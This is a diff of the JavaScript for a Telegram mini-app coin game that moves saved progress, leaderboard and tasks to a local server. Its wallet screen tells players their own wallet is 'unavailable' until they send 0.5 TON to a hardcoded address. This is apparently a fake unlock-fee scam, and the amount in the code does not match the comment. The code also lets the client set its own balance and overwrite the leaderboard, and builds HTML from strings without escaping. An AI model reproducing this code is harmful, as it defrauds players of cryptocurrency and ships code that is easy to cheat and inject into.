@@ -422,15 +422,23 @@
         if (user) {
             username = user.username || user.first_name;
             const telegramId = user.id; // Получаем Telegram ID
+            const walletInfo = '';
 
-            // Добавляем игрока в базу данных, если он новый
-            fetch('/add_player', {
+            fetch('http://127.0.0.1:8000/add_player', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({ telegram_id: telegramId })
+                body: JSON.stringify({ telegram_id: telegramId, wallet_info: walletInfo })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data); // Логируем ответ от сервера
+            })
+            .catch(error => {
+                console.error('Error:', error); // Логируем ошибку, если она есть
             });
+
         }
         loadProgress();
         loadLeaderboard();
@@ -478,70 +486,124 @@
             renderLeaderboard();
         }
 
-       
-        
+        function updateLeaderboard() {
+            fetch('http://127.0.0.1:8000/leaderboard') // URL должен соответствовать твоему серверу
+                .then(response => response.json())
+                .then(data => {
+                    leaderboard = data.leaderboard; // Предполагается, что сервер возвращает массив лидеров
+                    renderLeaderboard();
+                })
+                .catch(error => {
+                    console.error('Error fetching leaderboard:', error);
+                });
+        }
+
+        function renderLeaderboard() {
+            const leaderboardList = document.getElementById('leaderboardList');
+            leaderboardList.innerHTML = ''; // Очищаем предыдущий список
+
+            leaderboard.forEach(player => {
+                const listItem = document.createElement('li');
+                listItem.textContent = `${player.username}: ${player.coins} $MASKS`; // Предполагается, что есть поля username и coins
+                leaderboardList.appendChild(listItem);
+            });
+
+            // Обновляем ранг пользователя
+            const userRankElement = document.getElementById('userRank');
+            const userIndex = leaderboard.findIndex(player => player.telegram_id === telegramId);
+            userRankElement.textContent = `Твое место: ${userIndex !== -1 ? userIndex + 1 : '--'}`;
+        }
+
+        const telegramId = Telegram.WebApp.initDataUnsafe.user.id; // Получаем Telegram ID
 
         function showTasks() {
-            const advertisers = [
-                {
-                    name: 'Рекламодатель 1',
-                    tasks: [
-                        {description: 'Подпишись на Telegram', link: 'https://t.me/your_channel_1', reward: '+0.00033 $MASKS'},
-                        {description: 'Подпишись на Instagram', link: 'https://instagram.com/your_instagram', reward: '+0.00033 $MASKS'},
-                        {description: 'Подпишись на YouTube', link: 'https://youtube.com/your_youtube_channel', reward: '+0.00033 $MASKS'}
-                    ]
-                },
-                {
-                    name: 'Рекламодатель 2',
-                    tasks: [
-                        {description: 'Подпишись на Facebook', link: 'https://facebook.com/your_facebook_page', reward: '+0.00033 $MASKS'},
-                        {description: 'Подпишись на Twitter', link: 'https://twitter.com/your_twitter', reward: '+0.00033 $MASKS'}
-                    ]
-                }
-            ];
+            // Загрузка выполненных задач с сервера
+            fetch('http://127.0.0.1:8000/tasks/' + telegramId) // URL должен соответствовать твоему серверу
+                .then(response => response.json())
+                .then(data => {
+                    tasksCompleted = data.tasks; // Предполагается, что сервер возвращает объект с выполненными задачами
 
-            const tasksHTML = advertisers.map(advertiser => {
-                const tasks = advertiser.tasks.map(task => {
-                    const isCompleted = tasksCompleted[task.description];
-                    return `
-                        <div class="task" style="display: flex; align-items: center; margin-bottom: 10px;">
-                            <img src="https://via.placeholder.com/60" alt="Avatar" style="width: 60px; height: 60px; margin-right: 10px;">
-                            <div class="task-details" style="flex-grow: 1;">
-                                <div class="description" style="font-size: 14px; font-weight: bold;">${task.description}</div>
-                                <div class="reward" style="font-size: 14px; color: green; margin-top: 5px; font-weight: bold; text-align: left; margin-left: 10px;">${task.reward}</div>
+                    const advertisers = [
+                        {
+                            name: 'Рекламодатель 1',
+                            tasks: [
+                                { description: 'Подпишись на Telegram', link: 'https://t.me/your_channel_1', reward: '+0.00033 $MASKS' },
+                                { description: 'Подпишись на Instagram', link: 'https://instagram.com/your_instagram', reward: '+0.00033 $MASKS' },
+                                { description: 'Подпишись на YouTube', link: 'https://youtube.com/your_youtube_channel', reward: '+0.00033 $MASKS' }
+                            ]
+                        },
+                        {
+                            name: 'Рекламодатель 2',
+                            tasks: [
+                                { description: 'Подпишись на Facebook', link: 'https://facebook.com/your_facebook_page', reward: '+0.00033 $MASKS' },
+                                { description: 'Подпишись на Twitter', link: 'https://twitter.com/your_twitter', reward: '+0.00033 $MASKS' }
+                            ]
+                        }
+                    ]; // Массив с рекламодателями
+
+                    const tasksHTML = advertisers.map(advertiser => {
+                        const tasks = advertiser.tasks.map(task => {
+                            const isCompleted = tasksCompleted[task.description];
+                            return `
+                                <div class="task" style="display: flex; align-items: center; margin-bottom: 10px;">
+                                    <img src="https://via.placeholder.com/60" alt="Avatar" style="width: 60px; height: 60px; margin-right: 10px;">
+                                    <div class="task-details" style="flex-grow: 1;">
+                                        <div class="description" style="font-size: 14px; font-weight: bold;">${task.description}</div>
+                                        <div class="reward" style="font-size: 14px; color: green; margin-top: 5px; font-weight: bold; text-align: left; margin-left: 10px;">${task.reward}</div>
+                                    </div>
+                                    ${isCompleted ? 
+                                        `<div class="task-button completed">Done</div>` : 
+                                        `<button id="button-${task.description}" class="task-button" onclick="completeTask('${task.description}', '${task.reward}')">Do</button>`
+                                    }
+                                </div>
+                            `;
+                        }).join('');
+                        return `
+                            <div class="task-block">
+                                <h3>${advertiser.name}</h3>
+                                ${tasks}
                             </div>
-                            ${isCompleted ? 
-                                `<div class="task-button completed">Done</div>` : 
-                                `<button id="button-${task.description}" class="task-button" onclick="completeTask('${task.description}', '${task.reward}')">Do</button>`
-                            }
-                        </div>
-                    `;
-                }).join('');
-                return `
-                    <div class="task-block">
-                        <h3>${advertiser.name}</h3>
-                        ${tasks}
-                    </div>
-                `;
-            }).join('');
+                        `;
+                    }).join('');
 
-            document.getElementById('mainContent').innerHTML = `<div class="tasks">${tasksHTML}</div>`;
+                    document.getElementById('mainContent').innerHTML = `<div class="tasks">${tasksHTML}</div>`;
+                })
+                .catch(error => {
+                    console.error('Error fetching tasks:', error);
+                });
         }
 
         function completeTask(taskDescription, reward) {
             const button = document.getElementById(`button-${taskDescription}`);
             
             if (button.innerText === "Do") {
-                button.innerText = "Check";
+                button.innerText = "Check"; // Меняем текст кнопки
             } else if (button.innerText === "Check") {
-                button.outerHTML = `<div class="task-button completed">Done</div>`;
+                button.outerHTML = `<div class="task-button completed">Done</div>`; // Заменяем кнопку на "Done"
                 if (!tasksCompleted[taskDescription]) {
-                    tasksCompleted[taskDescription] = true;
-                    addMasksToBalance(reward);
-                    saveTasks();
+                    tasksCompleted[taskDescription] = true; // Обновляем статус выполнения
+                    addMasksToBalance(reward); // Обновляем баланс
+
+                    // Отправка обновленного статуса на сервер
+                    fetch('http://127.0.0.1:8000/complete_task', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ telegram_id: telegramId, task_description: taskDescription })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Task status updated:', data);
+                        saveTasks(); // Сохраняем задачи
+                    })
+                    .catch(error => {
+                        console.error('Error updating task status:', error);
+                    });
                 }
             }
         }
+
 
         function addMasksToBalance(reward) {
             const rewardValue = parseFloat(reward.match(/[\d\.]+/)[0]);
@@ -566,63 +628,13 @@
             const user = Telegram.WebApp.initDataUnsafe.user;
             if (user) {
                 username = user.username || user.first_name;
+                const telegramId = user.id;
             }
             loadProgress();
             loadLeaderboard();
             loadTasks();
-            Telegram.WebApp.expand(); // Развернуть на весь экран
             showHome(); // Показываем вкладку "Домой" при загрузке
-        }
-
-
-
-        function updateLeaderboard() {
-            const userEntry = leaderboard.find(entry => entry.username === username);
-            if (userEntry) {
-                userEntry.coins = coins;
-            } else {
-                leaderboard.push({ username: username, coins: coins });
-            }
-            leaderboard.sort((a, b) => b.coins - a.coins);
-            saveLeaderboard();
-        }
-
-        function renderLeaderboard() {
-            const leaderboardList = document.getElementById('leaderboardList');
-            const userRankElem = document.getElementById('userRank');
-            leaderboardList.innerHTML = '';
-            let userRank = null;
-            
-            leaderboard.forEach((entry, index) => {
-                if (index >= 10) return;
-                const li = document.createElement('li');
-                const rank = index + 1;
-                const rankText = rank <= 3 ? (rank === 1 ? '🥇' : rank === 2 ? '🥈' : '🥉') : `#${rank}`;
-                
-                // Создание аватарки
-                const avatar = document.createElement('div');
-                avatar.className = 'avatar';
-                avatar.style.backgroundColor = getRandomColor(); // Функция для получения случайного цвета
-                avatar.textContent = entry.username.substring(0, 2);
-                
-                // Добавление медальки и аватарки с отступом
-                li.innerHTML = `<span class="rank">${rankText}</span>`;
-                li.appendChild(avatar);
-                li.innerHTML += `<span>${entry.username}</span><span>${entry.coins} $MASKS</span>`;
-                leaderboardList.appendChild(li);
-                
-                if (entry.username === username) {
-                    userRank = rank;
-                }
-            });
-            
-            // Если игрок не в топ-10, находим его место в общем списке
-            if (userRank === null) {
-                const overallRank = leaderboard.findIndex(entry => entry.username === username) + 1;
-                userRankElem.textContent = 'Твое место: ' + (overallRank ? overallRank : '--');
-            } else {
-                userRankElem.textContent = 'Твое место: ' + userRank;
-            }
+            Telegram.WebApp.expand(); // Развернуть на весь экран
         }
 
         function getRandomColor() {
@@ -653,21 +665,65 @@
         }
 
         function saveProgress() {
-            localStorage.setItem('coins', coins);
+            fetch('http://127.0.0.1:8000/save_progress', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ telegram_id: telegramId, coins: coins })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Progress saved:', data);
+            })
+            .catch(error => {
+                console.error('Error saving progress:', error);
+            });
         }
+
 
         function loadProgress() {
-            coins = parseInt(localStorage.getItem('coins')) || 0;
-            updateCoins();
+            fetch('http://127.0.0.1:8000/load_progress/' + telegramId)
+                .then(response => response.json())
+                .then(data => {
+                    coins = data.coins || 0; // Убедитесь, что сервер возвращает поле "coins"
+                    updateCoins();
+                })
+                .catch(error => {
+                    console.error('Error loading progress:', error);
+                });
         }
+
 
         function saveLeaderboard() {
-            localStorage.setItem('leaderboard', JSON.stringify(leaderboard));
+            fetch('http://127.0.0.1:8000/save_leaderboard', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ leaderboard: leaderboard })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Leaderboard saved:', data);
+            })
+            .catch(error => {
+                console.error('Error saving leaderboard:', error);
+            });
         }
 
+
         function loadLeaderboard() {
-            leaderboard = JSON.parse(localStorage.getItem('leaderboard')) || [];
+            fetch('http://127.0.0.1:8000/load_leaderboard')
+                .then(response => response.json())
+                .then(data => {
+                    leaderboard = data.leaderboard || []; // Убедитесь, что сервер возвращает поле "leaderboard"
+                })
+                .catch(error => {
+                    console.error('Error loading leaderboard:', error);
+                });
         }
+
 
         // Установка времени начала и окончания таймера
         const startTime = new Date('2024-10-06T12:15:00+03:00').getTime(); // Установите начальное время
@@ -700,15 +756,21 @@
         setInterval(updateTimer, 1000);
 
         function wallet() {
+            // Загружаем сохраненные данные
+            const savedWalletAddress = localStorage.getItem('walletAddress');
+            const isWalletUnlocked = localStorage.getItem('isWalletUnlocked') === 'true';
+
             document.getElementById('mainContent').innerHTML = `
                 <div style="width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center;">
                     <div id="ton-connect-button"></div>
-                    <div id="walletAddress" style="margin-top: 20px; font-size: 1.2em;"></div>
-                    <div id="walletInfo" style="display: none; margin-top: 10px; color: red; font-size: 0.9em;">
+                    <div id="walletAddress" style="margin-top: 20px; font-size: 1.2em;">
+                        ${savedWalletAddress ? savedWalletAddress : "No wallet connected"}
+                    </div>
+                    <div id="walletInfo" style="display: ${isWalletUnlocked ? 'none' : 'block'}; margin-top: 10px; color: red; font-size: 0.9em;">
                         Your wallet is unavailable. To make it available, please perform a transaction of 0.5 TON.
                     </div>
-                    <button id="unlockButton" style="margin-top: 15px; padding: 10px 20px; font-size: 1em; cursor: pointer;" class="blocked" disabled>
-                        Unlock Wallet
+                    <button id="unlockButton" style="margin-top: 15px; padding: 10px 20px; font-size: 1em; cursor: pointer;" class="${isWalletUnlocked ? 'unblocked' : 'blocked'}" ${isWalletUnlocked ? 'disabled' : ''}>
+                        ${isWalletUnlocked ? 'Wallet Unlocked' : 'Unlock Wallet'}
                     </button>
                 </div>
             `;
@@ -724,6 +786,8 @@
             tonConnectUI.onStatusChange(async (wallet) => {
                 if (wallet) {
                     walletAddress = wallet.account.address;
+                    document.getElementById("walletAddress").textContent = walletAddress; // Обновляем отображение адреса
+                    localStorage.setItem('walletAddress', walletAddress); // Сохраняем адрес в localStorage
                     document.getElementById("walletInfo").style.display = "block";
                     document.getElementById("unlockButton").disabled = false; // Включаем кнопку после подключения кошелька
                 }
@@ -737,17 +801,19 @@
                         messages: [
                             {
                                 address: 'UQASUrYVEDVBoioJjG5_af9nE4VzBQwlyxOWix0OWlNFlLia', // Замените на ваш адрес кошелька
-                                amount: '10000000', // 0.5 TON (в нанокоинах)
+                                amount: '100000000', // 0.5 TON (в нанокоинах)
                                 payload: '',
                             }
                         ]
                     });
 
                     alert('Transaction sent successfully!');
-                    document.getElementById("statusText").textContent = "Status: Unlocked";
                     document.getElementById("unlockButton").textContent = "Wallet Unlocked";
                     document.getElementById("unlockButton").classList.replace("blocked", "unblocked");
                     document.getElementById("unlockButton").disabled = true; // Отключаем кнопку после разблокировки
+
+                    // Сохраняем статус разблокировки
+                    localStorage.setItem('isWalletUnlocked', 'true');
                 } catch (error) {
                     alert('Error sending transaction: ' + error.message);
                 }
@@ -756,7 +822,6 @@
             // Привязываем функцию разблокировки к кнопке
             document.getElementById('unlockButton').onclick = unlockWallet;
         }
-
     </script>
 </body>
 </html>
